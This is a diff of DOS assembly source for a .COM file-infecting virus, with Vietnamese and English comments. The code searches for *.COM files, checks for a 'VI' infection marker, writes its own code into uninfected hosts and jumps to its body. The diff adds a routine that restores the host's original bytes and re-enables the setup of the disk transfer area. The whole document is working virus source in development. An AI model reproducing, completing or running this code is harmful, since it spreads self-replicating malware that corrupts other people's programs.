@@ -12,23 +12,42 @@ START:
   
 VIRUS:       ;virus label        
 
-DATA_ARRAY DB 0,0,0,0,0    
+DATA_ARRAY DB 0,0,0,0,0        ; store byte to write
 
 START_VIRUS:
     call EXECUTE
+RESTORE_HOST:
+    mov ah,1AH
+    mov dx,80H
+    int 21H    
+    mov si,OFFSET HOST
+    add di,word ptr [di+DATA_ARRAY] 
+    push si
+    xchg si,di
+    movsw
+    movsw
+    movsb
+    ret                 ; return to host
     
+5BYTE_ORIGIN:
+    nop
+    nop 
+    nop 
+    nop
+    nop
+        
 EXECUTE:    
     pop di   
     sub di,offset EXECUTE
     call FIND_FILE 
            
 FIND_FILE:
-;    push bp
-;    sub sp,43H
-;    mov bp,sp
-;    mov dx,bp
-;    mov ah,1AH
-;    int 21H           ; push doan DTA search len stack
+    push bp
+    sub sp,43H
+    mov bp,sp
+    mov dx,bp
+    mov ah,1AH
+    int 21H           ; push doan DTA search len stack
     
     mov ah,4EH
     lea dx,[di+OFFSET COM_FILE]
@@ -50,8 +69,6 @@ CHECK_FILE:              ; check 5 byte ban dau.
     je  short CLOSE_FILE
     cmp word ptr [di+DATA_ARRAY+3],'IV'
     je  short CLOSE_FILE                    ; file da infected, move to next file.
-    mov si,word ptr [di+DATA_ARRAY]                  ; else store at si 
-    push si                                 ; push si to stack
     
     xor cx,cx
     xor dx,dx            ; cx:dx=0
@@ -63,6 +80,7 @@ CHECK_FILE:              ; check 5 byte ban dau.
     mov ah,40H
     int 21H    
     jc  short CLOSE_FILE 
+    
     
     xor cx,cx
     xor dx,dx
@@ -92,22 +110,12 @@ CLOSE_FILE:
     int 21H         ;search for next file
     jmp FIND_LOOP  
          
-DONE:
-;    mov ah,1AH                      ; restore DTA
-;    mov dx,80H
-;    int 21H                              
-;    mov si,offset START             ; restore 
-;    push si
-;    movsw
-;    movsw
-;    movsb     
-    ret                             ; tra lai access cho host
-        
+DONE:  ret                             ; return back to execute    
     
 COM_FILE    DB      '*.COM',0
 TEST_JMP: 
-     jmp near ptr START_VIRUS    
-     db 'VI' 
+    jmp near ptr START_VIRUS
+    db 'VI'
         
 ENDVIR:  
 
